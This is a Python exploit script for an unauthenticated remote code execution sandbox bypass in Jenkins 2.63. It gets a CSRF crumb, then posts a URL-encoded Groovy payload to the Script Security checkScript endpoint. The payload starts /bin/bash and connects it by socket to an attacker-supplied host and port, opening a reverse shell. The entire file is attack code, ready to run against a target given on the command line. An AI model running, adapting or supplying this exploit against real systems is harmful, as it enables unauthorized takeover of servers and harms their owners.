import base64
import requests
import argparse
from urllib.parse import quote

def get_crumb(host):
    url = host + '/crumbIssuer/api/json'
    json = requests.get(url).json()
    header = { json['crumbRequestField'] : json['crumb'] }
    return header

def exploit(host, lhost, lport):
    rev = quote('String host="' + lhost + '";int port=' + str(lport) +';String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();')
    url = host + f'/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public%20class%20x%20%7B%0A%20%20public%20x()%7B%0A{rev}%0A%7D%0A%7D'
    headers = get_crumb(host)
    response = requests.post(url, headers=headers)
    return response.text == '<div/>'

parser = argparse.ArgumentParser(prog="exploit.py", description="Jenkins 2.63 sanbox bypass - unauthenticated RCE", epilog="By LvMalware (https://github.com/lvmalware)")
parser.add_argument('-t', '--target', help='Target host')
parser.add_argument('-l', '--lhost', help='IP/Host for reverse shell')
parser.add_argument('-p', '--lport', help='Port for reverse shell')
args = parser.parse_args()
if args.target and args.lhost and args.lport:
    print(f"[*] Firing up exploit")
    exploit(args.target, args.lhost, args.lport)
    print("[*] Exploit finished")
else:
    print("Missing parameters. Use -h to see usage options")
